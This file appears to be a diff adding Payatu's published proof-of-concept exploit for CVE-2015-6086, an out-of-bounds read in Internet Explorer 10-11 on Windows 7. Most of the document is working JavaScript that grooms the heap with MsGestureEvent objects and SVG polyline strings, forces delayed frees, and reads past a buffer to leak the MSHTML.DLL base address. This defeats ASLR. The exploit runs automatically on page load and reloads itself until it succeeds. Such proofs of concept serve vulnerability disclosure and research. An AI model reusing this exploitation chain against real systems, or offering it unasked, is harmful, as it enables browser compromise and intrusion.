@@ -1,0 +1,264 @@
+<!--
+
+                      CVE-2015-6086
+             Out Of Bound Read Vulnerability
+     Address Space Layout Randomization (ASLR) Bypass
+
+Improper handling of new line and white space character caused
+Out of Bound Read in CDOMStringDataList::InitFromString. This
+flaw can be used to leak the base address of MSHTML.DLL and
+effectively bypass Address Space Layout Randomization.
+
+Affected Version:
+        Internet Explorer 9
+        Internet Explorer 10
+        Internet Explorer 11
+
+Test Bed:
+        IE: 10 & 11
+        KB: KB3087038
+        OS: Windows 7 SP1 x86
+
+Advisory:
+        http://www.payatu.com/advisory-ie_cdomstringdatalist/
+        https://technet.microsoft.com/library/security/MS15-112
+        http://www.zerodayinitiative.com/advisories/ZDI-15-547/
+
+Copyright 2016 © Payatu Technologies Pvt. Ltd.
+
+Author: Ashfaq Ansari
+Email: ashfaq[at]payatu[dot]com
+Websites: www.payatu.com
+          www.nullcon.net
+          www.hardwear.io
+          www.null.co.in
+
+This program is free software: you can redistribute it and/or modify it
+under the terms of the GNU General Public License as published by the
+Free Software Foundation, either version 3 of the License, or (at your
+option) any later version.
+
+This program is distributed in the hope that it will be useful, but WITHOUT
+ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License along with
+this program.  If not, see <http://www.gnu.org/licenses/>.
+
+THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING,
+BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
+PARTICULAR PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
+BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
+LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
+THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE
+OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+POSSIBILITY OF SUCH DAMAGE.
+-->
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IE 10-11 Windows 7 SP1 x86 - OOB Read ALSR Bypass PoC</title>
+    <meta http-equiv="pragma" content="no-cache"/>
+    <meta http-equiv="expires" content="0"/>
+    <script type="text/javascript">
+        /**
+         * This function is used to create string of desired size.
+         *
+         * @param character
+         * @param size
+         * @returns {string}
+         */
+        function createString(character, size) {
+            while (character.length < size) {
+                character += character;
+            }
+
+            // BSTR structure
+            // header  | unicode string     | NULL terminator
+            // 4 bytes | sizeof(string) * 2 | 2 bytes
+            return character.substr(0, (size - 6) / 2);
+        }
+
+        /**
+         * This function is used to get the Internet Explorer's version.
+         *
+         * @link http://stackoverflow.com/questions/19999388/jquery-check-if-user-is-using-ie
+         * @returns {int | null}
+         */
+        function getInternetExplorerVersion() {
+            var userAgent = window.navigator.userAgent;
+            var msie = userAgent.indexOf('MSIE');
+
+            if (msie > 0) {
+                return parseInt(userAgent.substring(msie + 5, userAgent.indexOf('.', msie)), 10);
+            }
+
+            var trident = userAgent.indexOf('Trident/');
+            if (trident > 0) {
+                var rv = userAgent.indexOf('rv:');
+                return parseInt(userAgent.substring(rv + 3, userAgent.indexOf('.', rv)), 10);
+            }
+
+            var edge = userAgent.indexOf('Edge/');
+            if (edge > 0) {
+                return parseInt(userAgent.substring(edge + 5, userAgent.indexOf('.', edge)), 10);
+            }
+            return null;
+        }
+
+        /**
+         * This function is used to leak the base address of MSHTML.DLL.
+         *
+         * @param offsetOfMSHTMLBaseAddress
+         */
+        function LeakMSHTMLBaseAddress(offsetOfMSHTMLBaseAddress) {
+            // Step 1: Let's do some clean up
+            CollectGarbage();
+
+            var eventArray = new Array();
+            var polyLineArray = new Array();
+            var exploitSuccessful = false;
+
+            // Step 2: As the target object is stored in Process Heap
+            // instead of Isolated Heap, we can use any element that
+            // is stored on Process Heap to spray the Heap.
+            //
+            // To create a predictable pattern on Heap, we spray using
+            // "MsGestureEvent" and it's size is 0x0A0. We will use
+            // this object to read the VFTable pointer.
+            for (var i = 0; i < 0x1000; i++) {
+                eventArray[i] = document.createEvent('MsGestureEvent');
+            }
+
+            // Step 3: Now we need to create a hole in the allocation
+            // that we made earlier. The purpose of this hole is to
+            // allocate the vulnerable buffer just before the Heap
+            // chunk of "MsGestureEvent"
+            for (i = 1; i < 0x500; i += 2) {
+                eventArray[i] = null;
+            }
+
+            // Step 4: As Memory Protector is enabled by default on all
+            // versions of IE, it will not allow the free of objects
+            // instantly. So, we need to force free the memory due to
+            // Delayed Frees.
+            CollectGarbage2();
+
+            // Step 5: Now, fill the hole that we created earlier. The
+            // "requiredFeatures" property is allocated on OLEAUT32 Cache
+            // Heap, old Plunger technique does not seems to work for me.
+            // I have used a neat trick to bypass OLEAUT32 Cache Heap.
+            for (i = 0; i < 0x250; i++) {
+                polyLineArray[i] = document.createElementNS('http://www.w3.org/2000/svg', 'polyline');
+
+                // Step 6: Trick to bypass allocation on OLEAUT32 Cached Heap
+                polyLineArray[i].setAttributeNS(null, 'attrib' + i, createString('A', 0x0A0));
+
+                // Step 7: Now, "requiredFeatures" property won't be allocated on OLEAUT32 Cache Heap.
+                polyLineArray[i].setAttributeNS(null, 'requiredFeatures', createString('\n', 0x0A0));
+
+                // Step 8: As the whole exploitation depends on certain Heap
+                // layout, thus, this is unreliable. But to overcome this
+                // un-reliability, I'm reloading the page until, right Heap
+                // Layout is achieved.
+                //
+                // This PoC is created for the vendor to acknowledge this bug,
+                // hence reliability is not my concern at this moment. We can
+                // make it more reliable, but let's leave it for later stage.
+                //
+                // Some heuristics to detect if Heap is in the right state.
+                // Once we have determined the Heap state, we can apply some
+                // more heuristics.
+                if (polyLineArray[i].requiredFeatures.numberOfItems == 2 && polyLineArray[i].requiredFeatures.getItem(1).length == 4) {
+                    // Step 9: Read the Out of Bound memory
+                    var OOBReadMemory = escape(polyLineArray[i].requiredFeatures.getItem(1));
+
+                    // Step 10: Some more heuristics
+                    var spitValue = OOBReadMemory.split('%');
+                    var CDOMMSGestureEvent_VFTablePointer = parseInt('0x' + spitValue[3].replace('u', '') + spitValue[2].replace('u', ''));
+                    var MSHTMLBaseAddress = CDOMMSGestureEvent_VFTablePointer - offsetOfMSHTMLBaseAddress;
+
+                    // Step 11: Show the message to user
+                    var message = 'MSHTML.DLL Base Address: 0x' + MSHTMLBaseAddress.toString(16);
+                    message += '\n';
+                    message += 'CDOMMSGestureEvent VFTable Pointer: 0x' + CDOMMSGestureEvent_VFTablePointer.toString(16);
+                    alert(message);
+
+                    // Step 12: Exploit successful
+                    exploitSuccessful = true;
+                    break;
+                }
+            }
+
+            // Step 13: As stated earlier, this is a bit unreliable.
+            // If the exploit has failed, reload the current page.
+            // If reloading does not help, close the browser and
+            // launch the exploit multiple times.
+            if (!exploitSuccessful) {
+                window.location.reload();
+            }
+        }
+
+        /**
+         * This function is used fill the wait list of the freed objects
+         * and trigger Garbage Collection.
+         */
+        function CollectGarbage2() {
+            // Microsoft implemented Memory Protector to mitigate
+            // Use after Free vulnerabilities. The object protected
+            // by Memory Protector won't be freed directly. Instead,
+            // it will be put into a wait list which will be freed
+            // when it reaches certain threshold (i.e 100,000 bytes).
+            var video = new Array();
+
+            // Now allocate video element (400 bytes) 250 times
+            //
+            // Note: We are not using stack to store the references.
+            // If we use stack to store the references, the memory
+            // will never be freed during Mark and Reclaim operation
+            for (var i = 0; i < 250; i++) {
+                video[i] = document.createElement('video');
+            }
+
+            // Now free the elements. It will be put into the wait list.
+            video = null;
+
+            // Reclaim the memory by triggering Garbage Collection
+            CollectGarbage();
+        }
+
+        /**
+         * This function is used to launch the exploitation by leaking
+         * the base address of MSHTML.DLL.
+         */
+        function LaunchExploit() {
+            var browserSupported = false;
+            var ieVersion = getInternetExplorerVersion();
+            var offsetOfMSHTMLBaseAddress = null;
+
+            if (ieVersion == 11) {
+                // If you are getting a wrong base address, please update this value
+                // offsetOfMSHTMLBaseAddress = VFTableAddress - MSHTMLBaseAddress
+                offsetOfMSHTMLBaseAddress = 0x0002ebe8;
+                browserSupported = true;
+            } else if (ieVersion == 10) {
+                // If you are getting a wrong base address, please update this value
+                // offsetOfMSHTMLBaseAddress = VFTableAddress - MSHTMLBaseAddress
+                offsetOfMSHTMLBaseAddress = 0x0000d270;
+                browserSupported = true;
+            } else {
+                alert('Current browser is not supported!\nExploit Tested on IE10 & 11 (Windows 7 SP1 x86)');
+            }
+
+            // Launch the exploit
+            if (browserSupported) {
+                LeakMSHTMLBaseAddress(offsetOfMSHTMLBaseAddress);
+            }
+        }
+    </script>
+</head>
+<body onload='LaunchExploit();'>
+</body>
+</html>
